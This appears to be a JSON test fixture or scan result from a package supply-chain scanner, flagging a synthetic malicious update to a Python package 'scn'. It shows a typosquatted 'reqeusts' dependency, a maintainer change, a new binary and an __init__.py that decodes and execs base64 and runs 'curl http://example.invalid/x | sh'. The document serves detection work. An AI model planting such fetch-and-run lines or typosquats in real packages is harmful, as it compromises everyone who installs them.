@@ -1,0 +1,112 @@
+{
+ "diff": {
+  "added_binaries": [
+   {
+    "path": "scn/_native.so",
+    "sha256": "ced1af6d51438341a0335cc00e1c2867fb718a537c1173cf210070a6b1cdf40a",
+    "size": 7
+   }
+  ],
+  "added_dep_findings": [
+   {
+    "name": "reqeusts",
+    "reason": "typosquat",
+    "target": "requests"
+   }
+  ],
+  "baseline_unavailable": "",
+  "changed": [
+   {
+    "change_kind": "modified",
+    "hunks": [
+     {
+      "added": [
+       "import os, base64",
+       "exec(base64.b64decode('cHJpbnQoMSk='))",
+       "os.system('curl http://example.invalid/x | sh')"
+      ],
+      "new_range": [
+       0,
+       3
+      ],
+      "old_range": [
+       0,
+       1
+      ],
+      "removed": [
+       "x = 1"
+      ]
+     }
+    ],
+    "new_text": "import os, base64\nexec(base64.b64decode('cHJpbnQoMSk='))\nos.system('curl http://example.invalid/x | sh')\n",
+    "path": "scn/__init__.py"
+   }
+  ],
+  "description": "scn summary",
+  "exec_context": "build (runs when pip builds or installs from this sdist): backend=setuptools.build_meta:__legacy__ [default]; backend-path=none; setup.py=present: its top level runs at build; cmdclass=none declared literally in setup.py (setup.py runs arbitrary code at build); setup_requires=none declared literally in setup.py (setup.py runs arbitrary code at build)\nstartup (.pth files; an `import` line runs at every interpreter start if the file is installed into site-packages): none declared literally in setup.py (setup.py runs arbitrary code at build)\nimport (runs when a program imports the package): packages=auto-discovered: scn; py-modules=auto-discovered: none declared literally in setup.py (setup.py runs arbitrary code at build); top_level.txt=not found in scanned files\ncommands (console_scripts/gui_scripts; run only when the user types them): none declared literally in setup.py (setup.py runs arbitrary code at build)\nplugins (entry points loaded automatically by another tool, e.g. pytest11 runs on every pytest run): none declared literally in setup.py (setup.py runs arbitrary code at build)\nother: files under tests/ docs/ examples/ are not imported by the package unless listed above",
+  "is_first_release": false,
+  "package": "scn",
+  "signals": "requires-dist added: reqeusts>=1\nrequires-dist removed: requests>=1\ndependency reqeusts: typosquat of requests (a popular package)\nadded file scn/_native.so: 7 bytes, new-binary\nmaintainer set changed: alice -> mallory",
+  "surface_omitted": null,
+  "version": "1.1"
+ },
+ "escalate": true,
+ "fired": [
+  {
+   "file": "scn/_native.so",
+   "lines": [
+    0,
+    0
+   ],
+   "rule": "binary-new-binary",
+   "weight": 10.0
+  },
+  {
+   "file": "scn/__init__.py",
+   "lines": [
+    1,
+    3
+   ],
+   "rule": "combo-decode-exec",
+   "weight": 45.0
+  },
+  {
+   "file": "reqeusts",
+   "lines": [
+    0,
+    0
+   ],
+   "rule": "dep-typosquat",
+   "weight": 40.0
+  },
+  {
+   "file": "<ownership>",
+   "lines": [
+    0,
+    0
+   ],
+   "rule": "maintainer-set-change",
+   "weight": 20.0
+  },
+  {
+   "file": "scn/__init__.py",
+   "lines": [
+    1,
+    3
+   ],
+   "rule": "primitives",
+   "weight": 15.0
+  },
+  {
+   "file": "scn/__init__.py",
+   "lines": [
+    1,
+    3
+   ],
+   "rule": "autoexec-location",
+   "weight": 45.0
+  }
+ ],
+ "prior_error": null,
+ "score": 175.0
+}
